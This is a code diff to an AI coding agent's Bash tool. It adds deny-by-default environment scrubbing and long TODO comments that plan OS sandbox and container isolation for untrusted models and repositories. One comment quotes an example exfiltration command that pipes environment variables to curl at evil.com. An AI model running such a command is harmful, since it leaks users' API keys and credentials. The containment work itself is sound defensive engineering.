@@ -1,6 +1,8 @@
 import { spawn } from 'child_process';
 import { randomBytes } from 'crypto';
 import type { ToolContext, ToolDefinition, ToolHandler, ToolResult } from './types.js';
+import { sanitizeEnv } from '../security/env.js';
+import { getEnvPolicy } from '../security/policy-state.js';
 
 // Static prefix for the post-run $PWD marker. A random nonce (per invocation)
 // is appended so a user command echoing the literal prefix cannot be confused
@@ -51,10 +53,15 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
   const sentinel = `${CWD_SENTINEL_PREFIX}${nonce}`;
   const wrapped = `${command}\n__factory_rc=$?\nprintf '\\n%s%s\\n' '${sentinel}:' "$PWD"\nexit $__factory_rc`;
 
+  // Env scrubbing (deny-by-default; see src/security/env.ts). Cuts the
+  // exfiltration surface to ~15 named vars + a few prefixes — model can
+  // no longer `printenv | curl -d @- evil.com` provider API keys.
+  const { env } = sanitizeEnv(process.env, getEnvPolicy());
+
   return new Promise((resolve) => {
     const proc = spawn('sh', ['-c', wrapped], {
       cwd,
-      env: process.env,
+      env,
       timeout,
     });
 
@@ -122,6 +129,75 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
     });
   });
 }
+
+// TODO(security, Tier 3): OS-level sandbox for the spawned shell.
+// Motivation:
+//   - Tier 1+2 (pattern policy + env scrub + path policy) are pure
+//     allow/deny checks. They reduce risk but don't *contain* a command
+//     once it runs: an approved `npm test` can still write anywhere the
+//     user can write, fork unbounded subprocesses, and reach the network.
+//   - For untrusted models or untrusted repositories (cloned project that
+//     has hostile package.json scripts), pattern matching alone is not
+//     enough — we want to bound the command's capabilities at the OS.
+// Shape:
+//   - Pluggable executor abstraction. Replace `spawn('sh', …)` with
+//     `executor.run(command, …)`. Default executor is the current
+//     unconstrained shell. Other executors:
+//       * macOS: `sandbox-exec -f <profile> sh -c "$cmd"`. Profile bind-
+//         allows project dir + tmp, denies network (network-outbound),
+//         denies file-read on home dot-dirs (~/.ssh, ~/.aws, ~/.factory).
+//         sandbox-exec is Apple-deprecated but still ships and works
+//         everywhere we run; zero install.
+//       * Linux: `bwrap` (bubblewrap, rootless, what Flatpak uses).
+//         `bwrap --ro-bind / / --bind <cwd> <cwd> --tmpfs /tmp
+//         --unshare-net --die-with-parent --new-session sh -c "$cmd"`.
+//         Fallback to `firejail` if bwrap missing.
+//   - Per-command opt-in for network: a rule like {pattern: 'npm install*',
+//     allowNetwork: true} re-enables network in the sandbox profile for
+//     that one command. Default-deny.
+//   - Selection: `--sandbox=auto|none|sandbox-exec|bwrap` flag,
+//     persisted in config. `auto` picks the platform default if available,
+//     warns and falls through to `none` otherwise (with a config setting
+//     to make missing-sandbox a hard error instead).
+// Detection:
+//   - Log every sandbox profile decision so users can see which restrictions
+//     fired. When a sandboxed command exits non-zero with a profile-violation
+//     signature in stderr, surface "this looks like a sandbox denial — see
+//     `sandbox-exec` profile" in the tool result so models don't go
+//     debugging the wrong layer.
+
+// TODO(security, Tier 4): container / microVM isolation for high-risk runs.
+// Motivation:
+//   - Tier 3 sandboxes share the kernel and the user's filesystem. They
+//     defeat casual exfiltration but not a kernel exploit, and any tool
+//     that legitimately needs broad host access (e.g. `code .`, opening a
+//     browser) has to be granted broadly. For "I'm pointing an unknown
+//     model at an unknown repo" runs, a stronger boundary is warranted.
+// Shape:
+//   - Opt-in `--sandbox=docker|lima|container` mode that runs every Bash
+//     command inside an ephemeral container with the project bind-mounted
+//     read-write and the rest of the host invisible.
+//   - Backend options:
+//       * Docker / Podman / Apple `container` for the OCI path. Image
+//         picked from config (default a small ubuntu/alpine + a `dev`
+//         tag). Container lives for the session, command runs via
+//         `docker exec` so we don't pay startup per call.
+//       * Lima (macOS) or Firecracker microVMs for stronger isolation
+//         without a full Docker daemon.
+//   - Network egress allowlist: container's resolver/proxy restricted to
+//     a list of hosts (registry.npmjs.org, github.com, …). Ship a
+//     reasonable default; let users extend.
+// Tradeoffs to flag in docs:
+//   - Slower startup (1–5s per session).
+//   - Some tools break: anything that needs to launch a host GUI, attach
+//     to host services, or read paths outside the project mount.
+//   - Different OS in the container — script behaviour can differ from
+//     the host (gnu vs bsd `sed`, etc.). Picking the container image is
+//     part of the user's setup, not a hidden default.
+// Detection:
+//   - Fail loudly if the user requested `--sandbox=docker` but the daemon
+//     isn't running, rather than silently falling through to a less
+//     restricted backend.
 
 export const bashTool: ToolHandler = {
   name: 'Bash',
